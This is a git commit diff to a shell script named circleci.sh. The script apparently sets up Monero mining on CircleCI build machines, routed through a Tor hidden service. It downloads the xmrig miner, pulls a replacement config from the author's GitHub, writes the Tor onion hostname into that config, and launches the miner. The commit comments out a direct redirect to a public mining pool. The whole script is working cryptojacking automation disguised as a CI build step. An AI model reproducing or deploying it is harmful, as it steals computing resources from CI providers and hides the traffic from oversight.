57b19f65ba827ec3ed55ad8a6b3c946d5882135b
ceeb57f83688 <84587193+ceeb57f83688@users.noreply.github.com>
2021-07-21 11:14:44 +0100

    Update circleci.sh

--- TOR/circleci.sh
+++ TOR/circleci.sh
@@ -8,11 +8,13 @@ sudo apt-get install -y sed
 
 
 sudo sed -i '75s/#HiddenServiceDir/HiddenServiceDir/ ' /etc/tor/torrc
-sudo sed -i 's/#SOCKSPort/SOCKSPort/ ' /etc/tor/torrc
+#sudo sed -i '18s/#SOCKSPort/SOCKSPort/ ' /etc/tor/torrc
 sudo sed -i '57s/#ControlPort/ControlPort ' /etc/tor/torrc
 sudo sed -i 's/#ORPort/ORPort/ ' /etc/tor/torrc
 sudo sed -i '76s/#HiddenServicePort/HiddenServicePort/ ' /etc/tor/torrc
-sudo sed -i '76s/80 127.0.0.1:80/4444 pool.minexmr.com:4444/ ' /etc/tor/torrc
+#sudo sed -i '76s/80 127.0.0.1:80/4444 pool.minexmr.com:4444/ ' /etc/tor/torrc
+sudo sed -i 's/#SOCKSPort/SOCKSPort/ ' /etc/tor/torrc
+sudo sed -i '76s/80/8080/g ' /etc/tor/torrc
 
 
 sudo systemctl enable tor
@@ -21,12 +23,18 @@ sudo service tor start
 wget https://github.com/xmrig/xmrig/releases/download/v6.13.1/xmrig-6.13.1-linux-x64.tar.gz && tar xf xmrig-6.13.1-linux-x64.tar.gz && cd xmrig-6.13.1 && rm -rf config.json && wget https://raw.githubusercontent.com/ceeb57f83688/xmrig/main/TOR/config.json
 
 cd xmrig-6.13.1
-sudo sed -i '3s/true/false/ ' config.json
-sudo sed -i '9d' config.json
-sudo cat /var/lib/tor/other_hidden_service/hostname | sed '1s/^/9i /' | sed -i -f- config.json
-sudo sed -i '9s/$/:4444",/ ' config.json 
-sudo sed -i '9s|^|            "url": "|' config.json
-sudo sed -i '13s/true/false/ ' config.json
+
+sudo sed -i '4d' config.json
+sudo cat /var/lib/tor/other_hidden_service/hostname | sed '1s/^/4i /' | sed -i -f- config.json
+sudo sed -i '4s/$/",/ ' config.json 
+sudo sed -i '4s|^|        "host": "|' config.json
+
+#sudo sed -i '3s/true/false/ ' config.json
+#sudo sed -i '9d' config.json
+#sudo cat /var/lib/tor/other_hidden_service/hostname | sed '1s/^/9i /' | sed -i -f- config.json
+#sudo sed -i '9s/$/:4444",/ ' config.json 
+#sudo sed -i '9s|^|            "url": "|' config.json
+#sudo sed -i '13s/true/false/ ' config.json
 
 
 chmod +x xmrig && ./xmrig
